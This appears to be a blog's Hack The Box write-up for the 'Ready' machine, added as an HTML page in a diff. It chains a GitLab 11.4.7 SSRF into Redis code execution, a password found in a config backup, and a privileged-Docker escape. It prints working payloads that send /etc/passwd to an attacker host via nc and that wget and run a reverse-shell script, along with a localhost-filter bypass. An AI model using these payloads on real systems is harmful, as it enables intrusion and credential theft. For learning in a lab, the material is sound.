@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.83.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark"><title>HTB Ready&nbsp;&ndash;&nbsp;The Wolf Den</title><link rel="stylesheet" href="/css/core.min.18c590792b52ec026068c0b889c0f13fac4882d13cdb8ad935c3a36b0036b3e3d725f8c8a0e7bbdcf0e6326fb80637f3.css" integrity="sha384-GMWQeStS7AJgaMC4icDxP6xIgtE824rZNcOjawA2s&#43;PXJfjIoOe73PDmMm&#43;4Bjfz"><meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="HTB Ready" /><body><section id="header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/"><img class="site logo" src="/img/NightWolf.jpg" alt /><span class="site name">The Wolf Den</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/ctf-writeups">CTF Writeups</a><a class="nav item" href="/htb-writeups">HTB Writeups</a><a class="nav item" href="/about">About</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
+    <h1 class="article title">HTB Ready</h1><p class="article date">2021-05-15</p></section><article class="article markdown-body"><p><img  src="/img/ready-logo.png"
+        alt/></p>
+<p>Ready is a GitLab instance were we exploit an SSRF in order to get code execution and find ourselves in a docker container. We find some credentials to escalate to root inside the container and then leverage the fact it was started with the &ldquo;privileged&rdquo; flag to escape the container.</p>
+<h2 id="enumeration">Enumeration</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-01-27 00:15 UTC
+Nmap scan report <span style="color:#66d9ef">for</span> 10.129.90.66
+Host is up <span style="color:#f92672">(</span>0.095s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">998</span> closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey:
+|   <span style="color:#ae81ff">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+5080/tcp open  http    nginx
+| http-robots.txt: <span style="color:#ae81ff">53</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
+| / /autocomplete/users /search /api /admin /profile
+| /dashboard /projects/new /groups/new /groups/*/edit /users /help
+|_/s/ /snippets/new /snippets/*/edit
+| http-title: Sign in <span style="color:#ae81ff">\x</span>C2<span style="color:#ae81ff">\x</span>B7 GitLab
+|_Requested resource was http://10.129.90.66:5080/users/sign_in
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 20.31 seconds
+</code></pre></div><p>NMAP shows that port 22 is open for SSH and there is a GitLab instance running a web server on port 5080. A sign in page is accessible that allows new accounts to be created.</p>
+<p><img  src="/img/ready-gitlabsignup.png"
+        alt/></p>
+<p>With a newly created account it is possible to check for any public projects or users to find more information in this box. However, in this instance there isn&rsquo;t anything and the instance appears blank.</p>
+<p><img  src="/img/ready-gitlabhelppage.png"
+        alt/></p>
+<p>It is possible to access a help page which, among other things, lists the current version, 11.4.7 and the notice to &ldquo;Update asap&rdquo;.</p>
+<p>Research on GitLab 11.4.7 there is a well know RCE through an Server Side Request Forgery, a type of vulnerability, where an an attacker can change a URL which the server will attempt to read or submit data too. In this case, it allows us to interact with an internal redis database service and start a malicious worker package.  This vulnerability was was featured in Real World CTF 2018 and LiveOverflow created a <a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/"target="_blank">video and blog post</a> detailing it.</p>
+<p>It is possible to follow along with the blog post to create a proof of concept allowing  <code>/etc/passwd</code> to be read.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> multi
+ sadd resque:gitlab:queues system_hook_push
+ lpush resque:gitlab:queue:system_hook_push <span style="color:#e6db74">&#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|cat /etc/passwd | nc 10.10.14.142 1234\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;</span>
+ exec
+ exec
+/ssrf.git
+</code></pre></div><p>This payload is URL encoded and then <code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/</code> is added to the front to bypass the check filter to block requests to localhost on the GitLab server. The next step is to create a new project and chose to import a git repo by URL.</p>
+<p><img  src="/img/ready-importproject.png"
+        alt/></p>
+<p>Provide our URL encoded payload, set up a netcat listener on port 1234, and then submitting the payload, returns the contents of <code>/etc/password</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git://<span style="color:#f92672">[</span>0:0:0:0:0:ffff:127.0.0.1<span style="color:#f92672">]</span>:6379/%0A%20multi%0A%20sadd%20resque:gitlab:queues%20system_hook_push%0A%20lpush%20resque:gitlab:queue:system_hook_push%20%22%7B%5C%22class%5C%22:%5C%22GitlabShellWorker%5C%22,%5C%22args%5C%22:%5B%5C%22class_eval%5C%22,%5C%22open<span style="color:#f92672">(</span>%5C<span style="color:#e6db74">&#39;%7Ccat%20/etc/passwd%20%7C%20nc%2010.10.14.142%201234%5C&#39;</span><span style="color:#f92672">)</span>.read%5C%22%5D,%5C%22retry%5C%22:3,%5C%22queue%5C%22:%5C%22system_hook_push%5C%22,%5C%22jid%5C%22:%5C%22ad52abc5641173e217eb2e52%5C%22,%5C%22created_at%5C%22:1513714403.8122594,%5C%22enqueued_at%5C%22:1513714403.8129568%7D%22%0A%20exec%0A%20exec%0A/ssrf.git
+</code></pre></div><p><img  src="/img/ready-etcpasswdfromimport.png"
+        alt/></p>
+<h2 id="foothold">Foothold</h2>
+<p>Obtaining a reverse shell proved to be a bit tricky. Executing one reverse shell directly from called back but then terminated immediately. Instead, a shell can be obtained in few additional steps. Create a bash reverse shell in a script and start a python http server. Then use two SSRF requests. The first one downloads the revershell using wget. The second one executes it.</p>
+<p><strong>Get script.sh</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> multi
+ sadd resque:gitlab:queues system_hook_push
+ lpush resque:gitlab:queue:system_hook_push <span style="color:#e6db74">&#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;| wget http://10.10.14.142/script.sh \&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;</span>
+ exec
+ exec
+/ssrf.git
+</code></pre></div><p><strong>Execute script.sh</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> multi
+ sadd resque:gitlab:queues system_hook_push
+ lpush resque:gitlab:queue:system_hook_push <span style="color:#e6db74">&#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;| bash script.sh \&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;</span>
+ exec
+ exec
+/ssrf.git
+</code></pre></div><p><img  src="/img/ready-shellhuzzah.png"
+        alt/></p>
+<h2 id="user">User</h2>
+<p>Very first thing to do, especially since this was a pain, is to upgrade are shell so we have more options and are less likely to crash it.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@gitlab:~/gitlab-rails/working$ python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+&lt;orking$ python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+git@gitlab:~/gitlab-rails/working$ ^Z
+zsh: suspended  nc -lnvp <span style="color:#ae81ff">1234</span>
+
+┌──<span style="color:#f92672">(</span>nightwolf㉿archlinux<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Ready<span style="color:#f92672">]</span>
+└─$ stty -a | head -n1 | cut -d <span style="color:#e6db74">&#39;;&#39;</span> -f 2-3 | cut -b2- | sed <span style="color:#e6db74">&#39;s/; /\n/&#39;</span>                                                                                          <span style="color:#ae81ff">148</span> ⨯ <span style="color:#ae81ff">1</span> ⚙
+rows <span style="color:#ae81ff">54</span>
+columns <span style="color:#ae81ff">170</span>
+
+┌──<span style="color:#f92672">(</span>nightwolf㉿archlinux<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Ready<span style="color:#f92672">]</span>
+└─$ stty raw -echo; fg                                                                                                                                                <span style="color:#ae81ff">1</span> ⚙
+<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + continued  nc -lnvp <span style="color:#ae81ff">1234</span>
+                               stty rows <span style="color:#ae81ff">54</span> cols <span style="color:#ae81ff">170</span>
+git@gitlab:~/gitlab-rails/working$ export TERM<span style="color:#f92672">=</span>xterm-256color
+git@gitlab:~/gitlab-rails/working$ exec /bin/bash
+git@gitlab:~/gitlab-rails/working$
+</code></pre></div><p>The user can be found in <code>/home/dude/user.txt</code> but the current user of <code>gitlab</code> is unable to read the file itself. <code>gitlab</code> doesn&rsquo;t have any interesting groups or files that stand out in it&rsquo;s  home folder. There don&rsquo;t have any passwords to try with suds or su. Expanding the search, for config files that might contain credentials or other interesting info,  <code>.dockerenv</code> is found. This  is a file in the root of the file system, letting us know that the current shell is inside a docker container.</p>
+<p><img  src="/img/ready-inthematrix.png"
+        alt/></p>
+<p>In the the <code>/opt</code> directory there is a folder titled &ldquo;backup&rdquo; inside are various configuration files for GitLab and a docker compose file that looks to have been the same one that may have been used to start this container.</p>
+<p>Another file present in the same folder is <code>gitlab.rb</code> a configuration file for GItLab. There is a lot of data to sift through inside it. Grep can be used to to filter out some more useful info. For example the following can be used to find references to &ldquo;password &ldquo;<code>grep -R &quot;password&quot; ./</code>  and reveals, <code>wW59U!ZKMbG9+*#h</code>.</p>
+<p><img  src="/img/ready-backupdirpassword.png"
+        alt/></p>
+<p>This password is not valid for <code>dude</code> but does allow  <code>su</code> to <code>root</code> user inside the container. User.txt is also accessible.</p>
+<h2 id="root">Root</h2>
+<p>Docker is a platform that makes use of Linux namespaces to provide an isolated environment called a container. They can seem similar to virtual machines but are different on a technical level. If you want to read some more about that you can check out the <a href="https://docs.docker.com/get-started/overview/#the-underlying-technology"target="_blank">documentation</a></p>
+<p>The docker compose file found before showed the container was likely started with the <code>--privileged</code> flag, not something. The <code>--privileged</code> flag launches the container with extended privileges that can be abused.</p>
+<p>From the documentation, &ldquo;By default, Docker containers are “unprivileged” and cannot, for example, run a Docker daemon inside a Docker container. This is because by default a container is not allowed to access any devices, but a “privileged” container is given access to all devices (see the documentation on <a href="https://www.kernel.org/doc/Documentation/cgroup-v1/devices.txt"target="_blank">cgroups devices</a>).</p>
+<p>When the operator executes <code>docker run --privileged</code>, Docker will enable access to all devices on the host as well as set some configuration in AppArmor or SELinux to allow the container nearly all the same access to the host as processes running outside containers on the host. Additional information about running with <code>--privileged</code> is available on the <a href="http://blog.docker.com/2013/09/docker-can-now-run-within-docker/"target="_blank">Docker Blog</a>.&rdquo;</p>
+<p>This is going to enable escape from the container and gain root on the host in two very simple commands. First make a directory and then simply mount sda2 in that directory.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkdir -p /mnt/hola
+mount /dev/sda2 /mnt/hola
+</code></pre></div><p>From the the file system from of the host system is accessible the container.  <code>/mnt/hola/root</code> contains the root flag.</p>
+<p><img  src="/img/ready-mountoutsidefilesystem.png"
+        alt/></p>
+<p>It is possible to obtain a root shell on the host system itself through several methods. One of which is retrive the root ssh key from, <code>/mnt/hola/root/.ssh/id_rsa</code></p>
+<p><img  src="/img/ready-caniintrestyouinashell.png"
+        alt/></p>
+<p><img  src="/img/ready-indeedyoucan.png"
+        alt/></p>
+<h2 id="wrap-up">Wrap up</h2>
+<p>Huge thanks to <a href="https://app.hackthebox.eu/users/27897"target="_blank">bertolis</a> for creating this machine.  I did see several comments talking about how it was very similar to another machine that was active at the time but it still felt unique to me, especially after foothold. A docker escape was also pretty fun and I&rsquo;d like to learn more advanced ways to do that in the future.</p>
+</article></div>
+<div class="article bottom"><section class="article navigation"><p><a class="link" href="/posts/ca-backdoor/"><span class="iconfont icon-article"></span>Cyber Apocalypse 2021: Backdoor</a></p></section></div></section><section id="footer"><div class="footer-wrap">
+    <p class="copyright">The Wolf Den</p>
+    <p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
+        target="_blank">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank">Notepadium</a></p></div></section></body>
+
+</html>
